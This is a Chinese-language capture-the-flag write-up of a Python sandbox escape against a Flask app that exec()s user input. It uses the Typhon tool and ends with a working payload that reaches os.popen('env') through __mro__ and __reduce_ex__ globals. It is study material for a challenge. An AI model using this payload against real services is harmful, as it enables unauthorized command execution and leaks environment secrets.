# 消栈逃出沙箱(1)反正不会有2

```py
from flask import Flask, request, Response
import sys
import io

app = Flask(__name__)

blackchar = "&*^%#${}@!~`·/<>"

def safe_sandbox_Exec(code):
    whitelist = {
        "print": print,
        "list": list,
        "len": len,
        "Exception": Exception
    }
    safe_globals = {"__builtins__": whitelist}

    original_stdout = sys.stdout
    original_stderr = sys.stderr
    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()

    try:
        exec(code, safe_globals)
        output = sys.stdout.getvalue()
        error = sys.stderr.getvalue()
        return output or error or "No output"
    except Exception as e:
        return f"Error: {e}"
    finally:
        sys.stdout = original_stdout
        sys.stderr = original_stderr

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/check', methods=['POST'])
def check():
    data = request.form['data']
    if not data:
        return Response("NO data", status=400)
    
    for d in blackchar:
        if d in data:
            return Response("NONONO", status=400)
            
    secret = safe_sandbox_Exec(data)
    return Response(secret, status=200)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)
```

这里使用一把梭工具[Typhon: 一种pyjail自动化绕过的思路及其粗略实现 - LamentXU - 博客园](https://www.cnblogs.com/LAMENTXU/articles/19101758)

```python
def payload(cmd):
    import Typhon
    Typhon.bypassRCE(
        cmd=cmd,
        local_scope={
            "__builtins__": {
                "print": print,
                "list": list,
                "len": len,
                "Exception": Exception,
            }
        },
        banned_chr="&*^%#${}@!~`·/<>",
        banned_re=[],
        # 题目没写长度限制，你可以不传 max_length，或给个较大值
        #max_length=160,
        interactive=False,
        print_all_payload=False,
        #log_level="INFO",
    )
payload("env")
```

构建payload,这里直接去运行

![image-20260104174917740](https://gitee.com/oranger2530/image-hosting/raw/master/20260104180709716.png)

`''.__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').system('env')`

![image-20260104174737172](https://gitee.com/oranger2530/image-hosting/raw/master/20260104180709717.png)

这里没有输出那再原基础上加一个print()

![image-20260104175129827](https://gitee.com/oranger2530/image-hosting/raw/master/20260104180709718.png)

这里可以看见回显0，这里代表已经运行成功了，但是依旧看不见想要回显的东西，我们需要的是响应流或者文件对象所以需要`.read()/.readline()`或者`.text/.json()`去接受数据

![image-20260104175512356](https://gitee.com/oranger2530/image-hosting/raw/master/20260104180709719.png)

但是又回显，也就是这里返回的类型是整形，这里问题出现在函数`system()`它返回的是一个 **整数退出码**，而我们需要的是数据可接受的对象，所以这里换成`popen()`即可

popen 提供了输出管道（可读对象），system 只给退出码（int）

![image-20260104180043623](https://gitee.com/oranger2530/image-hosting/raw/master/20260104180709720.png)

这里又接着回显`TextIOWrapper` 是“文件/流对象”,也即是说需要以一个文本的方式去读取，`.text没有属性所以报错`

![image-20260104180510123](https://gitee.com/oranger2530/image-hosting/raw/master/20260104180709721.png)

我们可以看见去掉之后回显的是一个对象

payload:

```
data=print("".__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').popen('env').read())
```

![image-20260104180641284](https://gitee.com/oranger2530/image-hosting/raw/master/20260104180709722.png)